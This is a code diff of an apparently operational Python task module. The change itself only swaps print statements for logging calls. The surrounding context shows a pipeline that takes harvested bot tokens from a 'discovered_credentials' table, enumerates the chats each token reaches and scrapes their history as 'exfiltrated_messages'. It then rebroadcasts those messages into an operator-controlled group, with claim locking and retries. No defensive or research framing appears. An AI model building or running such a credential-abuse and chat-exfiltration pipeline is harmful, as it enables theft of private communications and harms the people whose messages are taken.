@@ -7,6 +7,9 @@ from app.services.scraper_srv import scraper_service
 from app.services.broadcaster_srv import broadcaster_service
 import redis
 from app.core.config import settings
+import logging
+
+logger = logging.getLogger("flow.tasks")
 
 # Redis Client for Locking
 redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
@@ -28,7 +31,7 @@ def exfiltrate_chat(cred_id: str):
     return loop.run_until_complete(_exfiltrate_logic(cred_id))
 
 async def _exfiltrate_logic(cred_id: str):
-    print(f"🕵️ [Exfil] Starting exfiltration for credential {cred_id}")
+    logger.info(f"🕵️ [Exfil] Starting exfiltration for credential {cred_id}")
     await broadcaster_service.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token, chat_id").eq("id", cred_id).execute()
@@ -49,10 +52,10 @@ async def _exfiltrate_logic(cred_id: str):
 
     # Scrape
     try:
-        print(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
+        logger.info(f"⏳ [Exfil] Calling scraper service for chat {chat_id}...")
         await broadcaster_service.send_log(f"⏳ Scraping chat `{chat_id}`...")
         messages = await scraper_service.scrape_history(bot_token, chat_id)
-        print(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
+        logger.info(f"✅ [Exfil] Scraper returned {len(messages)} messages.")
         await broadcaster_service.send_log(f"✅ Scraped {len(messages)} messages.")
     except Exception as e:
         db.table("discovered_credentials").update({"status": "revoked"}).eq("id", cred_id).execute()
@@ -102,7 +105,7 @@ def enrich_credential(cred_id: str):
     return loop.run_until_complete(_enrich_logic(cred_id))
 
 async def _enrich_logic(cred_id: str):
-    print(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
+    logger.info(f"✨ [Enrich] Starting enrichment for credential {cred_id}")
     await broadcaster_service.send_log(f"✨ Starting enrichment for CredID: `{cred_id}`")
     # Fetch credential
     response = db.table("discovered_credentials").select("bot_token").eq("id", cred_id).execute()
@@ -121,9 +124,9 @@ async def _enrich_logic(cred_id: str):
     # Discover
     bot_info = {}
     try:
-        print(f"🔎 [Enrich] Discovering chats via ScraperService...")
+        logger.info(f"🔎 [Enrich] Discovering chats via ScraperService...")
         bot_info, chats = await scraper_service.discover_chats(bot_token)
-        print(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
+        logger.info(f"✅ [Enrich] Discovery returned {len(chats) if chats else 0} chats.")
         if chats:
             chat_list = ", ".join([f"{c['name']} ({c['id']})" for c in chats])
             await broadcaster_service.send_log(f"✅ Discovered chats: {chat_list}")
@@ -283,7 +286,7 @@ async def _broadcast_logic():
                 .execute()
             
             if not fresh.data:
-                print(f"    ⚠️ Message {msg_id} not found in DB, skipping")
+                logger.warning(f"    ⚠️ Message {msg_id} not found in DB, skipping")
                 continue
             
             # Check if already broadcasted (another worker completed it)
@@ -306,9 +309,9 @@ async def _broadcast_logic():
                         skipped_count += 1
                         continue
                     else:
-                        print(f"    🔄 Stale claim detected for {msg_id}, reclaiming...")
+                        logger.warning(f"    🔄 Stale claim detected for {msg_id}, reclaiming...")
                 except Exception as e:
-                    print(f"    ⚠️ Error parsing claimed_at for {msg_id}: {e}")
+                    logger.error(f"    ⚠️ Error parsing claimed_at for {msg_id}: {e}")
             
             # Claim this message by setting claimed_at to NOW
             claim_time = datetime.now(timezone.utc).isoformat()
@@ -318,7 +321,7 @@ async def _broadcast_logic():
                 .eq("is_broadcasted", False)\
                 .execute()
             
-            print(f"    📌 Claimed message {msg_id}")
+            logger.info(f"    📌 Claimed message {msg_id}")
             
             cred_id = msg["credential_id"]
             # Extract meta from the joined discovered_credentials
@@ -383,7 +386,7 @@ async def _broadcast_logic():
                 # Check for topic deletion/not found
                 err_str = str(e)
                 if "Topic_deleted" in err_str or "message thread not found" in err_str or "TOPIC_DELETED" in err_str:
-                    print(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
+                    logger.warning(f"    ⚠️ Topic {thread_id} deleted! Recreating '{topic_name}'...")
                     # Recreate
                     thread_id = await broadcaster_service.ensure_topic(group_id, topic_name)
                     # Update DB
@@ -396,9 +399,9 @@ async def _broadcast_logic():
                         await broadcaster_service.send_message(group_id, thread_id, msg)
                         send_success = True
                     except Exception as retry_e:
-                        print(f"    ❌ Failed after topic recreation: {retry_e}")
+                        logger.error(f"    ❌ Failed after topic recreation: {retry_e}")
                 else:
-                    print(f"    ❌ Send failed: {e}")
+                    logger.error(f"    ❌ Send failed: {e}")
             
             if send_success:
                 # ==============================================
@@ -409,7 +412,7 @@ async def _broadcast_logic():
                     "broadcast_claimed_at": None  # Clear claim
                 }).eq("id", msg_id).execute()
                 sent_count += 1
-                print(f"    ✅ Broadcasted msg {msg_id}")
+                logger.info(f"    ✅ Broadcasted msg {msg_id}")
             else:
                 # ==============================================
                 # FAILED: Clear claim so it can be retried
@@ -417,7 +420,7 @@ async def _broadcast_logic():
                 db.table("exfiltrated_messages").update({
                     "broadcast_claimed_at": None
                 }).eq("id", msg_id).execute()
-                print(f"    🔄 Cleared claim for retry: {msg_id}")
+                logger.warning(f"    🔄 Cleared claim for retry: {msg_id}")
             
             # Rate limit
             await asyncio.sleep(2.0) 
